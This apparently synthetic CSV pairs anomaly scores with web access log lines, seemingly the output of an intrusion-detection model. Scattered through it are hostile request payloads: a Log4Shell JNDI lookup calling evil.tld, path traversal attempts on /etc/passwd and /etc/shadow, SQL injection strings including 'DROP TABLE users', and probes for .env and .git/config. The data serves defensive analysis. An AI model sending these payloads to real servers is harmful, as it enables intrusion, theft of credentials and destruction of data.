score_content,score_session,score_fused,score_fused_norm,line
30.646806716918945,,30.646806716918945,30.646806716918945,220.49.61.66 - - [10/Jan/2025:12:17:17 +0000] "DELETE /api/products HTTP/1.1" 304 11671 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11.80209732055664,,11.80209732055664,11.80209732055664,11.75.30.121 - - [10/Jan/2025:12:17:19 +0000] "PUT /wp-login.php HTTP/1.1" 200 13208 "https://www.google.com/" "sqlmap/1.7.2#stable"
7.897850036621094,,7.897850036621094,7.897850036621094,187.173.6.248 - - [10/Jan/2025:12:17:19 +0000] "POST /about HTTP/1.1" 304 15754 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.2237281799316406,,2.2237281799316406,2.2237281799316406,27.203.66.208 - - [10/Jan/2025:12:17:19 +0000] "GET / HTTP/1.1" 200 15095 "https://example.com/" "python-requests/2.31.0"
73.51245880126953,,73.51245880126953,73.51245880126953,42.145.82.208 - - [10/Jan/2025:12:17:21 +0000] "OPTIONS /login HTTP/1.1" 200 1797 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
104.95759582519531,,104.95759582519531,104.95759582519531,94.180.61.120 - - [10/Jan/2025:12:17:24 +0000] "TRACE /login HTTP/1.1" 200 4468 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
35.07417297363281,,35.07417297363281,35.07417297363281,153.53.164.111 - - [10/Jan/2025:12:17:25 +0000] "PUT /search?q=camera HTTP/1.1" 200 5767 "https://news.ycombinator.com/" "curl/7.85.0"
76.43221282958984,,76.43221282958984,76.43221282958984,212.9.90.52 - - [10/Jan/2025:12:17:26 +0000] "OPTIONS /contact HTTP/1.1" 301 14983 "https://example.com/" "python-requests/2.31.0"
69.39917755126953,,69.39917755126953,69.39917755126953,215.164.253.174 - - [10/Jan/2025:12:17:28 +0000] "HEAD /search?q=router HTTP/1.1" 200 625 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
1.8066803216934204,,1.8066803216934204,1.8066803216934204,94.108.138.232 - - [10/Jan/2025:12:17:30 +0000] "GET /phpmyadmin HTTP/1.1" 200 5532 "https://twitter.com/" "dirb/2.22"
27.771547317504883,,27.771547317504883,27.771547317504883,131.105.8.233 - - [10/Jan/2025:12:17:30 +0000] "DELETE /about HTTP/1.1" 200 3017 "https://example.com/" "python-requests/2.31.0"
49.428382873535156,,49.428382873535156,49.428382873535156,181.94.198.39 - - [10/Jan/2025:12:17:33 +0000] "DELETE /search?q=router HTTP/1.1" 200 15694 "https://www.google.com/" "dirb/2.22"
30180.10546875,,30180.10546875,30180.10546875,134.122.229.51 - - [10/Jan/2025:12:17:34 +0000] "HEAD /search?q=router HTTP/1.1" 403 199 "https://www.google.com/" "nikto/2.5.0"
26.431068420410156,,26.431068420410156,26.431068420410156,112.80.97.213 - - [10/Jan/2025:12:17:35 +0000] "POST /search?q=headphones HTTP/1.1" 200 14572 "-" "nikto/2.5.0"
126.61083984375,,126.61083984375,126.61083984375,56.241.9.13 - - [10/Jan/2025:12:17:35 +0000] "TRACE /search?q=router HTTP/1.1" 200 12962 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
95.2728500366211,,95.2728500366211,95.2728500366211,232.46.191.111 - - [10/Jan/2025:12:17:37 +0000] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 4339 "-" "dirb/2.22"
30134.212890625,,30134.212890625,30134.212890625,62.149.192.248 - - [10/Jan/2025:12:17:37 +0000] "GET /api/product?id=123 HTTP/1.1" 400 1335 "https://news.ycombinator.com/" "dirb/2.22"
95.20687866210938,,95.20687866210938,95.20687866210938,239.155.235.137 - - [10/Jan/2025:12:17:37 +0000] "OPTIONS /search?q=ssd HTTP/1.1" 200 5726 "-" "nikto/2.5.0"
34.988121032714844,,34.988121032714844,34.988121032714844,32.56.37.104 - - [10/Jan/2025:12:17:37 +0000] "PUT /search?q=headphones HTTP/1.1" 200 1093 "https://example.com/" "nikto/2.5.0"
27.76152229309082,,27.76152229309082,27.76152229309082,85.63.61.34 - - [10/Jan/2025:12:17:37 +0000] "DELETE /contact HTTP/1.1" 200 17564 "https://twitter.com/" "curl/7.85.0"
0.19272452592849731,,0.19272452592849731,0.19272452592849731,178.157.142.240 - - [10/Jan/2025:12:17:39 +0000] "GET /assets/app.css HTTP/1.1" 200 2401 "-" "python-requests/2.31.0"
35.08814239501953,,35.08814239501953,35.08814239501953,59.93.134.18 - - [10/Jan/2025:12:17:39 +0000] "PUT /search?q=monitor HTTP/1.1" 200 13631 "https://news.ycombinator.com/" "python-requests/2.31.0"
26.47681999206543,,26.47681999206543,26.47681999206543,138.89.185.50 - - [10/Jan/2025:12:17:39 +0000] "POST /api/user?id=1;DROP TABLE users HTTP/1.1" 200 6276 "-" "curl/7.85.0"
0.22200654447078705,,0.22200654447078705,0.22200654447078705,179.148.18.230 - - [10/Jan/2025:12:17:39 +0000] "GET /assets/app.css HTTP/1.1" 200 8352 "https://twitter.com/" "nikto/2.5.0"
30145.82421875,,30145.82421875,30145.82421875,21.167.148.227 - - [10/Jan/2025:12:17:40 +0000] "PUT /api/backup?file=../../../../etc/shadow HTTP/1.1" 401 1245 "https://example.com/" "curl/7.85.0"
35.0731315612793,,35.0731315612793,35.0731315612793,133.184.152.27 - - [10/Jan/2025:12:17:41 +0000] "PUT /search?q=monitor HTTP/1.1" 200 9799 "-" "python-requests/2.31.0"
3.0207862854003906,,3.0207862854003906,3.0207862854003906,172.240.195.226 - - [10/Jan/2025:12:17:44 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 301 10293 "https://example.com/" "dirb/2.22"
95.25122833251953,,95.25122833251953,95.25122833251953,224.172.128.145 - - [10/Jan/2025:12:17:45 +0000] "OPTIONS /search?q=ssd HTTP/1.1" 200 16663 "https://example.com/" "dirb/2.22"
30115.0390625,,30115.0390625,30115.0390625,111.77.123.251 - - [10/Jan/2025:12:17:48 +0000] "POST /logout HTTP/1.1" 401 432 "-" "nikto/2.5.0"
13.476408958435059,,13.476408958435059,13.476408958435059,166.118.214.134 - - [10/Jan/2025:12:17:51 +0000] "PUT /about HTTP/1.1" 200 6001 "https://example.com/" "python-requests/2.31.0"
1.8952808380126953,,1.8952808380126953,1.8952808380126953,133.24.190.236 - - [10/Jan/2025:12:17:52 +0000] "GET /profile HTTP/1.1" 200 4252 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.70734977722168,,27.70734977722168,27.70734977722168,59.251.68.249 - - [10/Jan/2025:12:17:53 +0000] "DELETE /contact HTTP/1.1" 204 5520 "https://example.com/" "dirb/2.22"
26.483980178833008,,26.483980178833008,26.483980178833008,188.173.137.218 - - [10/Jan/2025:12:17:54 +0000] "POST /search?q=phone HTTP/1.1" 200 5556 "https://example.com/" "nikto/2.5.0"
126.56539916992188,,126.56539916992188,126.56539916992188,19.150.110.219 - - [10/Jan/2025:12:17:57 +0000] "TRACE /search?q=router HTTP/1.1" 200 2995 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
13.429633140563965,,13.429633140563965,13.429633140563965,76.39.232.223 - - [10/Jan/2025:12:17:58 +0000] "PUT /profile HTTP/1.1" 200 11392 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
26.46635627746582,,26.46635627746582,26.46635627746582,97.105.236.67 - - [10/Jan/2025:12:18:00 +0000] "POST /api/product?id=123 HTTP/1.1" 200 639 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
49.47408676147461,,49.47408676147461,49.47408676147461,86.204.29.39 - - [10/Jan/2025:12:18:02 +0000] "DELETE /search?q=ssd HTTP/1.1" 200 9481 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
26.455976486206055,,26.455976486206055,26.455976486206055,228.134.99.188 - - [10/Jan/2025:12:18:05 +0000] "POST /search?q=monitor HTTP/1.1" 200 8350 "https://twitter.com/" "nikto/2.5.0"
27.701946258544922,,27.701946258544922,27.701946258544922,244.75.205.181 - - [10/Jan/2025:12:18:06 +0000] "DELETE /contact HTTP/1.1" 200 3407 "https://example.com/" "curl/7.85.0"
2.969984292984009,,2.969984292984009,2.969984292984009,252.248.162.233 - - [10/Jan/2025:12:18:06 +0000] "POST /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 1175 "-" "dirb/2.22"
4.696022987365723,,4.696022987365723,4.696022987365723,79.69.41.1 - - [10/Jan/2025:12:18:09 +0000] "GET /server-status HTTP/1.1" 301 18065 "https://news.ycombinator.com/" "dirb/2.22"
35.127750396728516,,35.127750396728516,35.127750396728516,245.8.197.202 - - [10/Jan/2025:12:18:09 +0000] "PUT /search?q=camera HTTP/1.1" 200 19702 "https://example.com/" "python-requests/2.31.0"
95.1800537109375,,95.1800537109375,95.1800537109375,212.84.70.21 - - [10/Jan/2025:12:18:12 +0000] "OPTIONS /search?q=phone HTTP/1.1" 200 10235 "https://twitter.com/" "nikto/2.5.0"
49.12154769897461,,49.12154769897461,49.12154769897461,48.85.67.110 - - [10/Jan/2025:12:18:13 +0000] "HEAD /wp-login.php HTTP/1.1" 304 12718 "https://www.google.com/" "sqlmap/1.7.2#stable"
49.402103424072266,,49.402103424072266,49.402103424072266,20.47.38.154 - - [10/Jan/2025:12:18:16 +0000] "DELETE /search?q=phone HTTP/1.1" 200 591 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.916784286499023,,4.916784286499023,4.916784286499023,208.168.51.245 - - [10/Jan/2025:12:18:18 +0000] "POST /admin HTTP/1.1" 200 15526 "https://www.google.com/" "dirb/2.22"
49.484981536865234,,49.484981536865234,49.484981536865234,131.224.106.49 - - [10/Jan/2025:12:18:20 +0000] "DELETE /search?q=ssd HTTP/1.1" 200 12158 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.216519594192505,,2.216519594192505,2.216519594192505,66.210.184.210 - - [10/Jan/2025:12:18:20 +0000] "GET / HTTP/1.1" 200 13076 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
13.463668823242188,,13.463668823242188,13.463668823242188,191.44.158.31 - - [10/Jan/2025:12:18:20 +0000] "PUT /login HTTP/1.1" 200 3623 "-" "python-requests/2.31.0"
47.81895446777344,,47.81895446777344,47.81895446777344,71.16.142.40 - - [10/Jan/2025:12:18:22 +0000] "HEAD /login HTTP/1.1" 200 8556 "https://example.com/" "python-requests/2.31.0"
104.861572265625,,104.861572265625,104.861572265625,86.132.229.152 - - [10/Jan/2025:12:18:22 +0000] "TRACE /dashboard HTTP/1.1" 200 13322 "https://example.com/" "sqlmap/1.7.2#stable"
45.9416618347168,,45.9416618347168,45.9416618347168,245.119.114.121 - - [10/Jan/2025:12:18:24 +0000] "HEAD /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 8246 "https://twitter.com/" "dirb/2.22"
126.6277847290039,,126.6277847290039,126.6277847290039,106.114.22.79 - - [10/Jan/2025:12:18:24 +0000] "TRACE /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 7209 "https://example.com/" "dirb/2.22"
3.18441104888916,,3.18441104888916,3.18441104888916,148.180.48.107 - - [10/Jan/2025:12:18:25 +0000] "POST /wp-login.php HTTP/1.1" 200 10821 "https://news.ycombinator.com/" "nikto/2.5.0"
104.7813949584961,,104.7813949584961,104.7813949584961,223.145.59.173 - - [10/Jan/2025:12:18:28 +0000] "TRACE /phpmyadmin HTTP/1.1" 200 2213 "https://www.google.com/" "nikto/2.5.0"
0.3295519948005676,,0.3295519948005676,0.3295519948005676,235.224.218.45 - - [10/Jan/2025:12:18:31 +0000] "GET /index.html HTTP/1.1" 200 9270 "https://twitter.com/" "nikto/2.5.0"
50.80539321899414,,50.80539321899414,50.80539321899414,136.13.210.215 - - [10/Jan/2025:12:18:32 +0000] "HEAD /about HTTP/1.1" 304 7431 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
13.420528411865234,,13.420528411865234,13.420528411865234,92.245.111.192 - - [10/Jan/2025:12:18:33 +0000] "PUT /contact HTTP/1.1" 204 10508 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
106.33112335205078,,106.33112335205078,106.33112335205078,226.240.26.87 - - [10/Jan/2025:12:18:36 +0000] "TRACE /.git/config HTTP/1.1" 304 16947 "https://www.google.com/" "python-requests/2.31.0"
126.64140319824219,,126.64140319824219,126.64140319824219,199.245.238.227 - - [10/Jan/2025:12:18:38 +0000] "TRACE /search?q=phone HTTP/1.1" 200 15614 "https://example.com/" "sqlmap/1.7.2#stable"
26.47913932800293,,26.47913932800293,26.47913932800293,191.126.161.141 - - [10/Jan/2025:12:18:39 +0000] "POST /search?q=phone HTTP/1.1" 200 4616 "https://example.com/" "python-requests/2.31.0"
1.887709379196167,,1.887709379196167,1.887709379196167,148.14.24.100 - - [10/Jan/2025:12:18:41 +0000] "GET /dashboard HTTP/1.1" 200 18305 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
35.175086975097656,,35.175086975097656,35.175086975097656,164.120.74.4 - - [10/Jan/2025:12:18:41 +0000] "PUT /search?q=ssd HTTP/1.1" 200 12921 "https://example.com/" "curl/7.85.0"
23.51201057434082,,23.51201057434082,23.51201057434082,6.187.250.171 - - [10/Jan/2025:12:18:42 +0000] "GET /search?q=headphones HTTP/1.1" 200 263 "https://www.google.com/" "sqlmap/1.7.2#stable"
49.414676666259766,,49.414676666259766,49.414676666259766,68.69.157.222 - - [10/Jan/2025:12:18:45 +0000] "DELETE /search?q=laptop HTTP/1.1" 200 11887 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
26.386552810668945,,26.386552810668945,26.386552810668945,54.52.220.67 - - [10/Jan/2025:12:18:45 +0000] "POST /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 15885 "https://twitter.com/" "sqlmap/1.7.2#stable"
0.34620070457458496,,0.34620070457458496,0.34620070457458496,59.123.145.7 - - [10/Jan/2025:12:18:47 +0000] "GET /index.html HTTP/1.1" 200 13452 "-" "nikto/2.5.0"
52.40546798706055,,52.40546798706055,52.40546798706055,14.19.156.228 - - [10/Jan/2025:12:18:47 +0000] "DELETE /api/backup?file=../../../../etc/shadow HTTP/1.1" 302 10827 "https://www.google.com/" "python-requests/2.31.0"
30205.587890625,,30205.587890625,30205.587890625,31.101.41.131 - - [10/Jan/2025:12:18:50 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 400 1276 "https://twitter.com/" "sqlmap/1.7.2#stable"
23.580278396606445,,23.580278396606445,23.580278396606445,15.31.167.193 - - [10/Jan/2025:12:18:51 +0000] "GET /search?q=monitor HTTP/1.1" 200 15063 "https://example.com/" "python-requests/2.31.0"
2.211451292037964,,2.211451292037964,2.211451292037964,130.144.174.159 - - [10/Jan/2025:12:18:54 +0000] "GET / HTTP/1.1" 200 218 "https://news.ycombinator.com/" "dirb/2.22"
73.47427368164062,,73.47427368164062,73.47427368164062,129.207.10.115 - - [10/Jan/2025:12:18:54 +0000] "OPTIONS /logout HTTP/1.1" 204 2897 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
45.97592544555664,,45.97592544555664,45.97592544555664,3.151.56.114 - - [10/Jan/2025:12:18:57 +0000] "HEAD /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 17274 "-" "sqlmap/1.7.2#stable"
46.410709381103516,,46.410709381103516,46.410709381103516,16.178.245.245 - - [10/Jan/2025:12:18:58 +0000] "HEAD /.env HTTP/1.1" 200 18725 "https://www.google.com/" "nikto/2.5.0"
23.694887161254883,,23.694887161254883,23.694887161254883,207.116.151.118 - - [10/Jan/2025:12:19:00 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 4812 "https://www.google.com/" "dirb/2.22"
30112.08203125,,30112.08203125,30112.08203125,113.68.69.232 - - [10/Jan/2025:12:19:00 +0000] "GET /profile HTTP/1.1" 400 878 "-" "dirb/2.22"
30123.875,,30123.875,30123.875,179.253.201.228 - - [10/Jan/2025:12:19:01 +0000] "PUT /about HTTP/1.1" 404 82 "-" "python-requests/2.31.0"
49.42327880859375,,49.42327880859375,49.42327880859375,30.71.49.233 - - [10/Jan/2025:12:19:04 +0000] "DELETE /search?q=phone HTTP/1.1" 204 10102 "https://www.google.com/" "python-requests/2.31.0"
129.4324493408203,,129.4324493408203,129.4324493408203,190.135.246.9 - - [10/Jan/2025:12:19:07 +0000] "TRACE /search?q=headphones HTTP/1.1" 301 1396 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30114.9140625,,30114.9140625,30114.9140625,132.215.62.31 - - [10/Jan/2025:12:19:10 +0000] "POST /api/products HTTP/1.1" 401 632 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.572233200073242,,23.572233200073242,23.572233200073242,203.139.36.89 - - [10/Jan/2025:12:19:11 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 5570 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
49.40908432006836,,49.40908432006836,49.40908432006836,205.194.72.248 - - [10/Jan/2025:12:19:14 +0000] "DELETE /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 1185 "https://example.com/" "nikto/2.5.0"
13.512920379638672,,13.512920379638672,13.512920379638672,58.76.124.183 - - [10/Jan/2025:12:19:14 +0000] "PUT /login HTTP/1.1" 200 14510 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
1.9208852052688599,,1.9208852052688599,1.9208852052688599,15.244.248.28 - - [10/Jan/2025:12:19:16 +0000] "GET /logout HTTP/1.1" 200 2304 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
12.061861991882324,,12.061861991882324,12.061861991882324,242.233.58.72 - - [10/Jan/2025:12:19:19 +0000] "PUT /.env HTTP/1.1" 200 13376 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.31970229744911194,,0.31970229744911194,0.31970229744911194,54.36.202.149 - - [10/Jan/2025:12:19:20 +0000] "GET /index.html HTTP/1.1" 200 7120 "-" "sqlmap/1.7.2#stable"
52.42928695678711,,52.42928695678711,52.42928695678711,1.203.157.115 - - [10/Jan/2025:12:19:23 +0000] "DELETE /api/user?id=1;DROP TABLE users HTTP/1.1" 304 208 "https://example.com/" "sqlmap/1.7.2#stable"
26.494152069091797,,26.494152069091797,26.494152069091797,157.63.71.47 - - [10/Jan/2025:12:19:26 +0000] "POST /search?q=monitor HTTP/1.1" 200 18731 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
95.1667251586914,,95.1667251586914,95.1667251586914,39.51.158.37 - - [10/Jan/2025:12:19:29 +0000] "OPTIONS /search?q=router HTTP/1.1" 200 217 "https://example.com/" "dirb/2.22"
26.51099395751953,,26.51099395751953,26.51099395751953,42.83.95.170 - - [10/Jan/2025:12:19:32 +0000] "POST /api/user?id=1;DROP TABLE users HTTP/1.1" 200 14429 "https://twitter.com/" "dirb/2.22"
0.25043928623199463,,0.25043928623199463,0.25043928623199463,18.170.201.135 - - [10/Jan/2025:12:19:34 +0000] "GET /assets/app.css HTTP/1.1" 200 15655 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
26.591045379638672,,26.591045379638672,26.591045379638672,196.138.153.38 - - [10/Jan/2025:12:19:34 +0000] "POST /search?q=ssd HTTP/1.1" 200 126 "https://twitter.com/" "sqlmap/1.7.2#stable"
30112.326171875,,30112.326171875,30112.326171875,119.82.16.183 - - [10/Jan/2025:12:19:34 +0000] "GET /about HTTP/1.1" 403 217 "https://twitter.com/" "python-requests/2.31.0"
0.3443228006362915,,0.3443228006362915,0.3443228006362915,105.117.143.4 - - [10/Jan/2025:12:19:37 +0000] "GET /index.html HTTP/1.1" 200 12942 "https://twitter.com/" "dirb/2.22"
23.60453987121582,,23.60453987121582,23.60453987121582,93.106.157.208 - - [10/Jan/2025:12:19:37 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12938 "-" "sqlmap/1.7.2#stable"
0.13193608820438385,,0.13193608820438385,0.13193608820438385,192.56.115.137 - - [10/Jan/2025:12:19:40 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 18030 "https://www.google.com/" "dirb/2.22"
49.371158599853516,,49.371158599853516,49.371158599853516,184.134.230.62 - - [10/Jan/2025:12:19:43 +0000] "DELETE /search?q=camera HTTP/1.1" 200 2560 "-" "Wget/1.21.2 (linux-gnu)"
23.587615966796875,,23.587615966796875,23.587615966796875,71.22.64.244 - - [10/Jan/2025:12:19:45 +0000] "GET /search?q=router HTTP/1.1" 200 11653 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.1954982727766037,,0.1954982727766037,0.1954982727766037,108.79.231.105 - - [10/Jan/2025:12:19:47 +0000] "GET /assets/app.css HTTP/1.1" 200 871 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
35.043148040771484,,35.043148040771484,35.043148040771484,135.203.61.86 - - [10/Jan/2025:12:19:50 +0000] "PUT /search?q=monitor HTTP/1.1" 200 3617 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
0.2674567997455597,,0.2674567997455597,0.2674567997455597,225.250.2.176 - - [10/Jan/2025:12:19:53 +0000] "GET /assets/app.js HTTP/1.1" 200 13833 "https://example.com/" "curl/7.85.0"
69.43344116210938,,69.43344116210938,69.43344116210938,73.218.115.59 - - [10/Jan/2025:12:19:56 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 11610 "https://www.google.com/" "nikto/2.5.0"
95.01242065429688,,95.01242065429688,95.01242065429688,29.62.12.246 - - [10/Jan/2025:12:19:58 +0000] "OPTIONS /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 3925 "https://twitter.com/" "curl/7.85.0"
27.76703453063965,,27.76703453063965,27.76703453063965,185.26.84.54 - - [10/Jan/2025:12:20:01 +0000] "DELETE /admin HTTP/1.1" 200 1656 "https://www.google.com/" "nikto/2.5.0"
1.9903708696365356,,1.9903708696365356,1.9903708696365356,95.126.194.17 - - [10/Jan/2025:12:20:03 +0000] "GET /logout HTTP/1.1" 200 19057 "https://www.google.com/" "python-requests/2.31.0"
30182.14453125,,30182.14453125,30182.14453125,226.241.182.42 - - [10/Jan/2025:12:20:05 +0000] "OPTIONS /.git/config HTTP/1.1" 400 977 "https://news.ycombinator.com/" "nikto/2.5.0"
